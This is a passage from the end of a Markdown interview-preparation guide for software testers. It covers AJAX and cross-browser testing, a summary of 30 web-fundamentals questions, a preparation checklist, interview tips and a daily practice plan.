2. **Check DOM Changes**: Monitor mutations
3. **AJAX Complete**: Wait for requests
4. **Polling**: Check periodically

**Q29: Testing AJAX Applications**

Challenges:
- Dynamic content loading
- No page refresh
- Timing issues
- State management

Solutions:
- Use explicit waits
- Wait for AJAX completion
- Check network requests
- Verify DOM updates

**Q30: Cross-Browser Testing**

Key Points:
- Test on Chrome, Firefox, Safari, Edge
- Use BrowserStack/Sauce Labs for cloud testing
- Check browser compatibility
- Test on different OS
- Mobile vs Desktop
- Responsive design testing

**Tools**:
- Selenium Grid for parallel testing
- BrowserStack/Sauce Labs for cloud browsers
- Cypress for modern browser testing
- TestCafe for no-config testing

---

## Summary: 30 Web Fundamentals Questions Mastered

**Client-Server & HTTP (Q1-Q7)**:
1. How web works
2. HTTP vs HTTPS
3. Request/Response structure
4. HTTP methods
5. Status codes
6. 401 vs 403
7. 200 vs 201 vs 204

**Cookies & Sessions (Q8-Q10)**:
8. Cookies explained
9. Cookies vs Sessions
10. HttpOnly & Secure flags

**HTML & DOM (Q11-Q13)**:
11. DOM structure
12. id vs class
13. Element identification

**CSS & Selectors (Q14-Q16)**:
14. CSS selectors
15. CSS vs XPath
16. Best locator strategy

**Browser DevTools (Q17-Q20)**:
17. Network tab
18. Console debugging
19. Performance analysis
20. Command line basics

**Advanced Topics (Q21-Q30)**:
21-25. DevTools deep dive
26-30. JavaScript, AJAX, Browser testing

---

## Final Preparation Checklist

**Before Your Interview**:
- [ ] Understand client-server architecture
- [ ] Know all HTTP methods and status codes
- [ ] Explain cookies, sessions, security flags
- [ ] Identify elements using multiple strategies
- [ ] Use Browser DevTools confidently
- [ ] Write CSS selectors and XPath
- [ ] Understand DOM structure
- [ ] Debug using Console
- [ ] Analyze Network requests
- [ ] Know basic command line
- [ ] Test cross-browser
- [ ] Handle dynamic content

---

## Quick Interview Tips

**1. Always Give Examples**: Don't just explain - show real scenarios

**2. Relate to Testing**: Connect every concept to how you'd test it

**3. Be Practical**: Discuss real tools (Postman, DevTools, Selenium)

**4. Show Problem-Solving**: Explain how you debug issues

**5. Know Trade-offs**: CSS vs XPath, Cookies vs Sessions, etc.

**6. Stay Updated**: Mention modern practices (HTTPS, SameSite, etc.)

**7. Be Confident**: You've prepared 30 comprehensive questions!

---

## Practice Recommendations

**Daily Practice** (1 hour):
- Open DevTools on any website
- Inspect elements, network requests
- Find different locators
- Check cookies and sessions
- Practice with Postman

**Weekly** (3-4 hours):
- Test automation practice
- Different locator strategies
- Handle dynamic content
- Cross-browser testing
- API testing with Postman

**Before Interview**:
- Review all 30 questions
- Practice explaining to someone
- Use real websites as examples
- Be ready to demonstrate in browser

---

**Congratulations!** You now have comprehensive knowledge of **60 interview questions** (30 Software Testing + 30 Web Fundamentals) covering everything needed for Phase 1!

Keep practicing, stay confident, and good luck with your interview! 🚀

---

*Complete Web Fundamentals Interview Preparation Guide*
*30 Questions with Real-World Examples and Hands-on Testing Focus*
*Ready for 10-Year Experience Testing Role*
